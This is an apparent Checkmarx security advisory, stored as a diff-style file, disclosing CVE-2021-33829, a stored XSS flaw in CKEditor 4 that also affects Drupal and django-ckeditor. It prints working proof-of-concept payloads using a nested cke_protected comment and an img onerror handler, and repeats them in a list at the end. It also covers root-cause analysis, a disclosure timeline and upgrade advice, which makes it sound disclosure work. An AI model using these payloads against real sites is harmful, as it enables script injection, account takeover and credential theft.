@@ -1,0 +1,127 @@
+
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\checkmarx\20241224_102819_537233\Website1024x5125.png
+CKEditor 4 is a popular WYSIWYG editor, widely used in websites, web frameworks, and content management systems (CMS) such as Drupal and Backdrop. According to its website, the editor is “approved by millions, fully customizable, and the #1 rich text editor with the most features.” The Checkmarx Security Research Team discovered a stored cross-site scripting (XSS) vulnerability – assigned CVE-2021-33829 – that affects CKEditor 4 users in edit mode.
+Impact Summary
+CKEditor 4 is commonly used and may affect a variety of environments, such as blogs, content management systems, and other websites that accept rich text content from users. Successful exploitation of the vulnerability leads to arbitrary web script injection. The impact depends on where the plugin is used. It may lead to account takeover, credential stealing, sensitive data exposure, etc.
+
+When we found the vulnerability in CKEditor 4, we informed the maintainers. They didn’t initially consider our finding as a security issue, but released a new version with the fix (4.16.1). We continued our research and found that Drupal and django-ckeditor are vulnerable to XSS because of the issue we found. We informed both, and they pulled the CKEditor 4 version 4.16.1.
+
+From here, we asked MITRE to issue a CVE because we strive to inform all CKEditor 4 dependents to get the CKEditor 4 latest version. Later on, CKEditor 4 realized the significance of our finding took the responsibility to issue CVE-2021-33829.
+CVSS Score
+CVSS: 3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+
+Score: 6.1 (Medium)
+Description
+In June 2020, CVE-2020-9281 was published due to a cross-site scripting CKEditor 4. The cause for this issue is in the HTML data processor that doesn’t sanitize a payload that contains the reserved ck_protected keyword.
+
+The reserved  “cke_protected” keyword is used internally by CKEditor 4 developers. It is an HTML comment that’s content is encoded. For simplicity, we’ll use the term ‘protected ‘comment’ in this blog.
+
+The CKEditor 4 developers’ solution was to ensure there are no externally injected protected comments before parsing by removing instances of the protected comment. Since the keyword is only removed once, nesting the keyword yields the keyword (e.g., keykeywordword -> keyword). This allows an attacker to bypass this protection mechanism and exploit the XSS vulnerability, which was assumed to be fixed.
+Original Proof-of-Concept for CVE-2020-9281
+
+Click the source button in CKEditor 4
+Paste the following payload:
+Xss<!--{cke_protected} --!><img src=1 onerror=alert(`XSS`)> -->Attack
+
+Click the source button again to return to the regular editor.
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\checkmarx\20241224_102819_537233\Picture12.png
+
+CVE-2020-9281 Fix With the Payload Above
+
+Click the source button in CKEditor 4
+Paste the following payload:
+Xss<!--{cke_protected} --!><img src=1 onerror=alert(`XSS`)>-->Attack
+
+Click the source button again to return to the regular editor
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\checkmarx\20241224_102819_537233\Picture21.png
+
+Proof-of-Concept of the Flawed Fix of CVE-2020-9281
+
+Click the source button in CKEditor 4
+Paste the following payload:
+Xss<!--{cke{cke_protected}_protected} --!><img src=1 onerror=alert(`XSS`)> Attack
+
+Click the source button again to return to the regular editor.
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\checkmarx\20241224_102819_537233\Picture32.png
+
+Proof-of-Concept of the Flawed Fix of CVE-2020-9281 in Drupal
+
+Edit a basic page
+Click the source button in CKEditor4
+Paste the following payload:
+Xss<!--{cke{cke_protected}_protected} --!><img src=1 onerror=alert(`XSS`)> Attack
+
+Save the page
+The following user that edits the same page is exposed, as demonstrated in the screenshot below:
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\checkmarx\20241224_102819_537233\Picture41.png
+
+Proof-of-Concept of the Flawed Fix of CVE-2020-9281 in django-ckeditor
+
+Click the source button in CKEditor4
+Paste the following payload:
+Xss<!--{cke{cke_protected}_protected} --!><img src=1 onerror=alert(`XSS`)> Attack
+
+Click the source button again to return to the regular editor or click the save button
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\checkmarx\20241224_102819_537233\Picture51.png
+
+Vulnerability Analysis
+The htmldataprocessor’s removeReserveKeywords function aims to ensure there are no externally injected protected comment keywords before parsing.  However, it fails to remove instances of the protected comment recursively.
+
+The removeReserveKeywords removes instances of the protected comment keyword.
+The parse method splits to elements array what is left from the payload using a regular expression.
+The regular expression identifies comments with the following structure
+<!--Comment -->.
+
+If the input contains a comment with an extra exclamation mark, like this
+
+<!--comment --!>,
+
+the regular expression does not consider the – -!> suffix as a closing tag of the comment and treats the rest of the input as a comment until a proper closing suffix appears, like this “- ->”.
+
+The third element of the array that resulted from the regular expression processing is a comment.
+The protectRealComments encodes the third element of the array if it considers it as a real comment. In a case of a nested protected comment, the protectedRealComments input contains a protected comment. For that reason, the protectedRealComments doesn’t encode it.
+The browser identifies the suffix of the following input <- -comment – -!> as an error and mutates the input into proper html comment: <!- -comment – ->. The remainder of the payload stays out of the html comment unencoded.
+When the algorithm processes the new Proof-of-Concept, the following occurs:
+
+An attacker injects this payload
+Xss<!--{cke_{cke_protected}protected}--!><img src=1 onerror=alert(`xss`)> -->Attack
+
+The removeReserveKeywords removes the {cke_protected} and what is left from the payload is:
+Xss<!--{cke_protected}--!><img src=1 onerror=alert(`xss`)> -->Attack
+
+Since –!> is not treated as a comment end tag , the CKEditor4 parse method considers the whole highlighted text as a protected comment
+Xss<!--{cke_protected}--!><img src=1 onerror=alert(`xss`)> -->Attack
+
+The protectRealComments identifies the comment as protected comment and doesn’t  encode its content.
+The browser mutates the payload, and the exclamation mark is removed. Because of that, the comment is closed, and the rest of the payload remains unsanitized, with the ineffectual closing comment at the end.
+Xss<!--{cke_protected}--><img src=1 onerror=alert(`xss`)> -->Attack
+
+The browser runs the unsanitized img onerror event
+Recommendations:
+The fix for this issue has been released, and it is highly recommended to update CKEditor 4 and Drupal to the latest available version. Regarding CKEditor, moving to CKEditor 5 is also an option.
+
+While CKEditor 5 exists, CKEditor 4 is still maintained because they are not entirely alike. CKEditor 5 doesn’t have an out-of-the-box source button for freestyle HTML coding. It’s possible to achieve the source button functionality by developing a plugin or consuming a plugin of third parties.
+Timeline of Disclosure:
+April 28, 2021 – Disclosure to CKSource
+May 18, 2021 – Disclosure to Drupal
+May 20, 2021 – CKEditor4.16.1 release, mitigating the vulnerability
+May 26, 2021 – Drupal 9.2 release and security advisory mitigating the vulnerability
+May 26, 2021 – Backdrop CMS (a fork of Drupal) 1.19.1 release and security advisory mitigating the vulnerability
+May 29, 2021 – django-ckeditor 6.1.0 release, mitigating the vulnerability
+June 03, 2021 – CVE-2021-33829 assigned
+June 14, 2021 – Public disclosure
+Conclusion
+This type of activity is part of the Checkmarx Security Research Team’s ongoing efforts to protect the software supply chain. Once the Checkmarx Security Team reveals a vulnerability in a package or a component, we immediately inform and help the maintainers mitigate the vulnerability. We also warn CxSCA customers if they use the vulnerable solution. Once the maintainer releases a fix, Checkmarx customers are the first to know.
+
+No matter how a code is secured, using third party components exposes websites, services, and other software solutions. Therefore, it’s extremely important to mitigate vulnerabilities in widely used components and protect the supply chain.
+Xss<!--{cke_protected} --!><img src=1 onerror=alert(`XSS`)> -->Attack
+Xss<!--{cke_protected} --!><img src=1 onerror=alert(`XSS`)>-->Attack
+Xss<!--{cke{cke_protected}_protected} --!><img src=1 onerror=alert(`XSS`)> Attack
+Xss<!--{cke{cke_protected}_protected} --!><img src=1 onerror=alert(`XSS`)> Attack
+Xss<!--{cke{cke_protected}_protected} --!><img src=1 onerror=alert(`XSS`)> Attack
+<!--Comment -->.
+<!--comment --!>,
+Xss<!--{cke_{cke_protected}protected}--!><img src=1 onerror=alert(`xss`)> -->Attack
+Xss<!--{cke_protected}--!><img src=1 onerror=alert(`xss`)> -->Attack
+Xss<!--{cke_protected}--!><img src=1 onerror=alert(`xss`)> -->Attack
+Xss<!--{cke_protected}--><img src=1 onerror=alert(`xss`)> -->Attack
